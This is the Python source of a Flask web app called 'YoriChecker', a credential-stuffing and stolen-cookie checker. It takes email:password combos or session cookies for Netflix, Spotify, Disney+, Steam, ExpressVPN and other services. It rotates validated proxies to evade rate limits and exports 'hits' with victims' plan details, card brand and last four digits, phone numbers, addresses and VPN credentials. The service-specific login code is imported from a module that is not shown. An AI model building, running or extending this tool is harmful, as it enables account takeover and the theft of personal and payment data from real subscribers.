import os
import io
import json
import time
import uuid
import threading
import requests
from flask import Flask, request, render_template_string, send_file, Response
from concurrent.futures import ThreadPoolExecutor, as_completed
import checker

app = Flask(__name__)

tasks = {}
task_lock = threading.Lock()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker // Unified</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        
        * {
            box-sizing: border-box;
        }

        body {
            background: #111;
            color: #eee;
            font-family: 'Space Mono', monospace;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1100px; margin: 0 auto; width: 100%; }
        
        .site-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 4px solid #ff5500;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .site-logo {
            width: 70px;
            height: 70px;
            object-fit: contain;
            border: 3px solid #ff5500;
            box-shadow: 5px 5px 0px #000;
            background: #222;
            padding: 5px;
        }
        h1 {
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 4px 4px 0px #000;
            margin: 0;
            color: #ff5500;
            font-size: 28px;
        }
        .header-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 8px;
        }
        .btn-telegram {
            background: #0088cc;
            color: #fff;
            border: 2px solid #000;
            padding: 10px 20px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            text-decoration: none;
            box-shadow: 4px 4px 0px #000;
            transition: transform 0.1s, box-shadow 0.1s;
            font-family: 'Space Mono', monospace;
            text-align: center;
            display: inline-block;
        }
        .btn-telegram:hover { transform: translate(2px, 2px); box-shadow: 2px 2px 0px #000; }
        .btn-telegram:active { transform: translate(4px, 4px); box-shadow: 0px 0px 0px #000; }
        
        .made-by {
            color: #888;
            font-size: 12px;
            text-decoration: none;
            font-family: 'Space Mono', monospace;
            transition: color 0.2s;
        }
        .made-by:hover { color: #00ffaa; }

        .service-select {
            width: 100%;
            padding: 15px;
            background: #222;
            color: #00ffaa;
            border: 3px solid #444;
            box-shadow: 8px 8px 0px #000;
            font-family: 'Space Mono', monospace;
            font-size: 16px;
            font-weight: bold;
            text-transform: uppercase;
            margin-bottom: 20px;
            cursor: pointer;
            appearance: none;
            -webkit-appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ffaa" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 15px top 50%;
        }
        .panels { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .panel {
            flex: 1;
            min-width: 280px;
            background: #222;
            border: 3px solid #444;
            box-shadow: 10px 10px 0px #000;
            padding: 15px;
        }
        .panel h3 {
            margin-top: 0;
            border-bottom: 2px solid #555;
            padding-bottom: 5px;
            text-transform: uppercase;
            color: #00ffaa;
        }
        textarea {
            width: 100%;
            height: 150px;
            background: #000;
            color: #00ffaa;
            border: 2px solid #555;
            padding: 10px;
            font-family: 'Space Mono', monospace;
            box-shadow: inset 4px 4px 0px #111;
            resize: vertical;
        }
        input[type="file"] {
            margin-top: 10px;
            color: #ccc;
            display: block;
            font-family: 'Space Mono', monospace;
            width: 100%;
        }
        .btn {
            background: #ff5500;
            color: #000;
            border: 3px solid #000;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 8px 8px 0px #000;
            transition: transform 0.1s, box-shadow 0.1s;
            font-family: 'Space Mono', monospace;
            width: 100%;
            margin-top: 20px;
        }
        .btn:hover { transform: translate(2px, 2px); box-shadow: 6px 6px 0px #000; }
        .btn:active { transform: translate(8px, 8px); box-shadow: 0px 0px 0px #000; }
        .btn:disabled {
            background: #555;
            color: #888;
            cursor: not-allowed;
            box-shadow: 8px 8px 0px #000;
            transform: none;
        }
        .btn-small {
            background: #00ffaa;
            color: #000;
            border: 2px solid #000;
            padding: 8px 15px;
            font-size: 14px;
            font-weight: bold;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 5px 5px 0px #000;
            margin-top: 10px;
            font-family: 'Space Mono', monospace;
            transition: transform 0.1s, box-shadow 0.1s;
        }
        .btn-small:hover { transform: translate(1px, 1px); box-shadow: 4px 4px 0px #000; }
        .btn-small:active { transform: translate(5px, 5px); box-shadow: 0px 0px 0px #000; }
        .btn-small:disabled {
            background: #555;
            color: #888;
            cursor: not-allowed;
            box-shadow: 5px 5px 0px #000;
            transform: none;
        }
        #logArea {
            background: #000;
            border: 3px solid #444;
            box-shadow: 10px 10px 0px #000;
            height: 300px;
            overflow-y: scroll;
            padding: 15px;
            font-size: 13px;
            color: #00ffaa;
            white-space: pre-wrap;
            margin-top: 20px;
            font-family: 'Space Mono', monospace;
            word-break: break-all;
        }
        #downloadBtn {
            display: none;
            background: #00ffaa;
            color: #000;
        }
        .status-text {
            margin-top: 10px;
            font-weight: bold;
            color: #ff5500;
        }

        @media (max-width: 600px) {
            body { padding: 10px; }
            .site-header { flex-direction: column; align-items: flex-start; gap: 15px; }
            .header-right { width: 100%; align-items: flex-start; flex-direction: row; justify-content: space-between; }
            h1 { font-size: 22px; }
            .site-logo { width: 50px; height: 50px; }
            .btn { font-size: 16px; padding: 12px 20px; }
            .panel { box-shadow: 6px 6px 0px #000; }
            #logArea { box-shadow: 6px 6px 0px #000; height: 250px; font-size: 12px; }
            .service-select { box-shadow: 6px 6px 0px #000; font-size: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="site-header">
            <div class="header-left">
                <img src="/logo.png" alt="YoriChecker Logo" class="site-logo" onerror="this.style.display='none'">
                <h1>YoriChecker</h1>
            </div>
            <div class="header-right">
                <a href="https://t.me/+y8EekRvqpnQzNjZl" target="_blank" class="btn-telegram">JOIN CHANNEL</a>
                <a href="https://t.me/WhoEvenYori" target="_blank" class="made-by">Made by @WhoEvenYori</a>
            </div>
        </header>
        
        <select id="service" class="service-select">
            <option value="expressvpn">🌐 ExpressVPN (email:pass)</option>
            <option value="crunchyroll" selected>🍿 Crunchyroll (email:pass)</option>
            <option value="disney">🏰 Disney+ (email:pass)</option>
            <option value="netflixcookie">🎬 Netflix Cookie</option>
            <option value="spotify">🎵 Spotify Cookie</option>
            <option value="prime">📺 Prime Video Cookie</option>
            <option value="microsoft">🎮 Microsoft Rewards (email:pass)</option>
            <option value="nba">🏀 NBA League Pass (email:pass)</option>
            <option value="steam">🎮 Steam (email:pass)</option>
        </select>

        <div class="panels">
            <div class="panel">
                <h3>Accounts / Cookies</h3>
                <textarea id="accounts_text" placeholder="email:pass or cookie string"></textarea>
                <input type="file" id="accounts_file" accept=".txt" onchange="loadFile(this, 'accounts_text')">
            </div>
            <div class="panel">
                <h3>Proxies</h3>
                <textarea id="proxies_text" placeholder="ip:port:user:pass or ip:port"></textarea>
                <input type="file" id="proxies_file" accept=".txt" onchange="loadFile(this, 'proxies_text')">
                <button class="btn-small" id="validateBtn" onclick="validateProxies()">VALIDATE PROXIES</button>
                <div class="status-text" id="proxyStatus">Load proxies to begin.</div>
            </div>
        </div>
        
        <button class="btn" id="startBtn" disabled onclick="startChecking()">START CHECKING</button>
        
        <div id="logArea">[System] Awaiting input...</div>
        
        <button class="btn" id="downloadBtn">DOWNLOAD RESULTS</button>
    </div>

    <script>
        let workingProxies = [];
        let accountsLoaded = false;
        let proxiesValidated = false;

        function loadFile(input, textareaId) {
            const file = input.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(e) {
                const textarea = document.getElementById(textareaId);
                textarea.value = textarea.value ? textarea.value + '\\n' + e.target.result : e.target.result;
                updateStartButton();
            };
            reader.readAsText(file);
        }

        function updateStartButton() {
            accountsLoaded = document.getElementById('accounts_text').value.trim().length > 0;
            document.getElementById('startBtn').disabled = !(accountsLoaded && proxiesValidated);
        }

        document.getElementById('accounts_text').addEventListener('input', updateStartButton);

        async function processStream(url, payload, onMessage) {
            const response = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            const reader = response.body.getReader();
            const decoder = new TextDecoder();
            let buffer = '';
            while(true) {
                const {done, value} = await reader.read();
                if(done) break;
                buffer += decoder.decode(value, {stream: true});
                const lines = buffer.split('\\n');
                buffer = lines.pop();
                for(const line of lines) {
                    if(line.startsWith('data: ')) {
                        try {
                            onMessage(JSON.parse(line.substring(6)));
                        } catch(e) {}
                    }
                }
            }
        }

        async function validateProxies() {
            const text = document.getElementById('proxies_text').value;
            const proxies = text.split('\\n').filter(l => l.trim());
            if (proxies.length === 0) {
                proxiesValidated = false;
                updateStartButton();
                return;
            }
            
            proxiesValidated = false;
            updateStartButton();
            document.getElementById('validateBtn').disabled = true;
            document.getElementById('proxyStatus').textContent = 'Validating...';
            
            const logArea = document.getElementById('logArea');
            logArea.innerHTML = '';
            
            await processStream('/validate_proxies', {proxies: proxies}, (data) => {
                if (data.log) {
                    logArea.innerHTML += data.log + '\\n';
                    logArea.scrollTop = logArea.scrollHeight;
                } else if (data.event === 'done') {
                    workingProxies = data.working_proxies;
                    logArea.innerHTML += `\\n${data.count}\\n`;
                    logArea.scrollTop = logArea.scrollHeight;
                    proxiesValidated = workingProxies.length > 0;
                    document.getElementById('validateBtn').disabled = false;
                    document.getElementById('proxyStatus').textContent = data.count;
                    updateStartButton();
                }
            });
        }

        async function startChecking() {
            const fullAccounts = document.getElementById('accounts_text').value;
            const service = document.getElementById('service').value;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('startBtn').textContent = 'CHECKING...';
            document.getElementById('logArea').innerHTML = '';
            
            await processStream('/check', {service: service, accounts: fullAccounts, working_proxies: workingProxies}, (data) => {
                if (data.log) {
                    document.getElementById('logArea').innerHTML += data.log + '\\n';
                    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
                } else if (data.event === 'done') {
                    document.getElementById('downloadBtn').style.display = 'block';
                    document.getElementById('downloadBtn').onclick = () => {
                        window.location.href = `/download/${data.task_id}`;
                    };
                    document.getElementById('startBtn').textContent = 'START CHECKING';
                    document.getElementById('startBtn').disabled = false;
                }
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/logo.png')
def logo():
    try:
        return send_file('logo.png', mimetype='image/png')
    except FileNotFoundError:
        return "Logo not found", 404

@app.route('/health')
def health():
    return "OK", 200

@app.route('/validate_proxies', methods=['POST'])
def validate_proxies():
    data = request.json
    proxies = [p.strip() for p in data.get('proxies', []) if p.strip()]
    
    def stream():
        working = []
        for p in proxies:
            try:
                proxy_dict = {"http": p, "https": p}
                r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=7)
                if r.status_code == 200:
                    yield f"data: {json.dumps({'log': f'Testing {p}... ✓ working', 'working': True})}\n\n"
                    working.append(p)
                else:
                    yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed (status {r.status_code})', 'working': False})}\n\n"
            except Exception as e:
                yield f"data: {json.dumps({'log': f'Testing {p}... ✗ failed ({str(e)[:20]})', 'working': False})}\n\n"
        
        yield f"data: {json.dumps({'event': 'done', 'working_proxies': working, 'count': f'Found {len(working)} working proxies out of {len(proxies)}'})}\n\n"
        
    return Response(stream(), mimetype='text/event-stream')

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    service = data.get('service', 'crunchyroll')
    accounts_raw = data.get('accounts', '')
    working_proxies = data.get('working_proxies', [])
    
    cookie_services = ['netflixcookie', 'spotify', 'prime']
    entries = []
    
    if service in cookie_services:
        entries = [line.strip() for line in accounts_raw.splitlines() if line.strip()]
    else:
        for line in accounts_raw.splitlines():
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    entries.append((parts[0], parts[1]))
                
    task_id = str(uuid.uuid4())
    
    proxy_manager = checker.SmartProxyManager(working_proxies)
    results = []
    results_lock = threading.Lock()
    logs = []
    logs_lock = threading.Lock()
    
    def log(msg):
        with logs_lock:
            ts = time.strftime("%H:%M:%S")
            logs.append(f"[{ts}] {msg}")

    checker_map = {
        'expressvpn': checker.ExpressVPNChecker,
        'crunchyroll': checker.CrunchyrollChecker,
        'disney': checker.DisneyChecker,
        'netflixcookie': checker.NetflixCookieChecker,
        'spotify': checker.SpotifyChecker,
        'prime': checker.PrimeVideoChecker,
        'microsoft': checker.MicrosoftRewardsChecker,
        'nba': checker.NBAChecker,
        'steam': checker.SteamChecker
    }
    
    CheckerClass = checker_map.get(service)

    def get_identifier(entry):
        if service in cookie_services:
            return entry[:30] + "..." if len(entry) > 30 else entry
        return f"{entry[0]}:{entry[1]}"

    def check_entry(entry):
        max_attempts = 3
        attempts = 0
        
        while attempts < max_attempts:
            proxy = proxy_manager.get_proxy()
            
            log(f"Checking {get_identifier(entry)} with proxy {proxy or 'DIRECT'}...")
            
            class SingleProxyMgr:
                def __init__(self, p): self.p = p
                def get_proxy(self): return self.p
                def mark_bad(self): pass
            
            mgr = SingleProxyMgr(proxy) if proxy else None
            chk = CheckerClass(mgr)
            
            if service in cookie_services:
                res = chk.check_account(entry)
            else:
                res = chk.check_account(entry[0], entry[1])
                
            status = res.get('status', 'ERROR')
            
            if status == 'HIT':
                proxy_manager.report_success(proxy)
                log(f"{get_identifier(entry)} -> HIT!")
                return res
            elif status in ('INVALID', 'FREE', 'DEAD', 'BAD', 'EXPIRED', 'UNKNOWN', '2FA', 'BANNED', 'RESET'):
                proxy_manager.report_success(proxy)
                log(f"{get_identifier(entry)} -> BAD ({status})")
                return res
            else:
                proxy_manager.report_rate(proxy, 60)
                log(f"Proxy {proxy or 'DIRECT'} hit RATE/ERROR ({status}). Cooldown 60s.")
                attempts += 1
                time.sleep(2)
                
        log(f"{get_identifier(entry)} -> RATE (max retries exhausted)")
        return {'status': 'RATE', 'error': 'Max retries exhausted'}

    def run():
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(check_entry, e): e for e in entries}
            for future in as_completed(futures):
                res = future.result()
                with results_lock:
                    results.append((futures[future], res))
        
        with task_lock:
            tasks[task_id] = (service, results)

    threading.Thread(target=run).start()
    
    def stream():
        last_log_idx = 0
        while True:
            with logs_lock:
                current_logs = list(logs)
            
            for i in range(last_log_idx, len(current_logs)):
                yield f"data: {json.dumps({'log': current_logs[i]})}\n\n"
            last_log_idx = len(current_logs)
            
            with task_lock:
                if task_id in tasks:
                    yield f"data: {json.dumps({'event': 'done', 'task_id': task_id})}\n\n"
                    break
            
            time.sleep(0.5)
            
    return Response(stream(), mimetype='text/event-stream')

@app.route('/download/<task_id>')
def download(task_id):
    with task_lock:
        task_data = tasks.get(task_id, (None, []))
        service, task_results = task_data
        
    hits = []
    bads = []
    rates = []

    def format_hit_line(svc, entry, res):
        d = res.get('data', res)
        identifier = entry
        if svc in ['netflixcookie', 'spotify', 'prime']:
            email = res.get('email') or res.get('data', {}).get('email')
            if email and email != 'N/A': identifier = email
            else: identifier = entry[:50] + "..." if len(entry) > 50 else entry
        else:
            identifier = f"{entry[0]}:{entry[1]}"

        if svc == 'expressvpn':
            return f"{identifier} | Plan: {d.get('plan')} | Expires: {d.get('expire_date')} ({d.get('days_left')}d) | Auto: {d.get('auto_renew')} | Pay: {d.get('payment_method')} | Lic: {d.get('license')} | OVPN: {d.get('ovpn_user')}:{d.get('ovpn_pass')} | PPTP: {d.get('pptp_user')}:{d.get('pptp_pass')}"
        elif svc == 'crunchyroll':
            return f"{identifier} | User: {d.get('user')} | Plan: {d.get('plan')} | Streams: {d.get('streams')} | Expires: {d.get('expires')} | Renew: {d.get('renew')} | CC: {d.get('country')} | Pay: {d.get('payment')} | SKU: {d.get('sku')}"
        elif svc == 'disney':
            profiles = ', '.join(d.get('profiles', []))
            return f"{identifier} | Plan: {d.get('plan')} | Status: {d.get('subscriber_status')} | CC: {d.get('country')} | Billing: {d.get('billing_cycle')} | Pay: {d.get('payment_provider')} | Expiry: {d.get('expiry')} ({d.get('remaining_days')}d) | Trial: {d.get('free_trial')} | Ver: {d.get('email_verified')} | Hulu: {d.get('hulu')} | Profiles: {profiles}"
        elif svc == 'netflixcookie':
            return f"{identifier} | Name: {d.get('name')} | Plan: {d.get('plan')} | Price: {d.get('price')} | Since: {d.get('member_since')} | Next: {d.get('next_billing')} | Trial: {d.get('free_trial')} | Quality: {d.get('video_quality')} | Streams: {d.get('max_streams')} | Extra: {d.get('extra_slots')} | Card: {d.get('card_brand')} {d.get('card_last4')} | Pay: {d.get('payment_method')} | CC: {d.get('country')} | Ph: {d.get('phone')} ({d.get('phone_verified')}) | Profiles: {', '.join(d.get('profiles', []))} | PC: {d.get('login_pc')} | Phone: {d.get('login_phone')} | TV: {d.get('login_tv')}"
        elif svc == 'spotify':
            return f"{identifier} | Plan: {d.get('plan_display')} | CC: {d.get('country')} | Owner: {not d.get('isSubAccount')} | Slots: {d.get('freeSlots')} | Invite: {d.get('inviteLink')} | Addr: {d.get('address')} | Child: {d.get('isChildAccount')} | Trial: {d.get('isTrialUser')} | Next: {d.get('nextPaymentDate')} | Autopay: {d.get('autopayStatus')} | Type: {d.get('currentPlan')}"
        elif svc == 'prime':
            return f"{identifier} | Profile: {d.get('profile')} | Region: {d.get('region')} | Plan: {d.get('plan_display')} | Status: Active"
        elif svc == 'microsoft':
            return f"{identifier} | CC: {d.get('country')} | Holder: {d.get('card_holder')} | Bal: {d.get('balance')} | Subs: {d.get('purchased_items')} | Auto: {d.get('auto_renew')} | Start: {d.get('start_date')} | Renew: {d.get('renewal_date')} | Pts: {d.get('points')}"
        elif svc == 'nba':
            return f"{identifier} | Name: {d.get('displayname')} | Expiry: {d.get('end_date')} | CC: {d.get('country')} | Renew: {d.get('renewal')}"
        elif svc == 'steam':
            notable = ', '.join([g['name'] for g in d.get('notable', [])])
            top10 = ', '.join([f"{g['name']}({g['playtime']}m)" for g in d.get('games_list', [])[:10]])
            return f"{identifier} | Persona: {d.get('persona')} | ID: {d.get('steamid')} | CC: {d.get('country')} | Lvl: {d.get('level')} | Games: {d.get('game_count')} | VAC: {d.get('vac_bans')} | Trade: {d.get('trade_ban')} | Lim: {d.get('limited')} | Notable: {notable} | Top10: {top10}"
        return f"{identifier} | HIT"

    for entry, res in task_results:
        status = res.get('status')
        if status == 'HIT':
            hits.append(format_hit_line(service, entry, res))
        elif status in ('INVALID', 'FREE', 'DEAD', 'BAD', 'EXPIRED', 'UNKNOWN', '2FA', 'BANNED', 'RESET'):
            err = res.get('error') or res.get('reason') or status
            if service in ['netflixcookie', 'spotify', 'prime']:
                email = res.get('email') or res.get('data', {}).get('email')
                identifier = email if (email and email != 'N/A') else (entry[:50] + "..." if len(entry) > 50 else entry)
            else:
                identifier = f"{entry[0]}:{entry[1]}"
            bads.append(f"{identifier} | {err}")
        else:
            err = res.get('error') or res.get('reason') or 'Rate limit / Network Error'
            if service in ['netflixcookie', 'spotify', 'prime']:
                email = res.get('email') or res.get('data', {}).get('email')
                identifier = email if (email and email != 'N/A') else (entry[:50] + "..." if len(entry) > 50 else entry)
            else:
                identifier = f"{entry[0]}:{entry[1]}"
            rates.append(f"{identifier} | {err}")

    sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    output = []
    output.append(sep)
    output.append("HITS (Active Paid Subscriptions)")
    output.append(sep)
    output.extend(hits)
    output.append("\n" + sep)
    output.append("BAD (Invalid / Free / Dead)")
    output.append(sep)
    output.extend(bads)
    output.append("\n" + sep)
    output.append("RATE (Rate Limits / Network Errors)")
    output.append(sep)
    output.extend(rates)
    output.append("\n" + sep)
    output.append(f"SUMMARY: TOTAL HITS: {len(hits)} | BAD: {len(bads)} | RATE: {len(rates)}")
    output.append(sep)

    mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
    return send_file(mem, as_attachment=True, download_name=f'YoriChecker_{service}.txt', mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
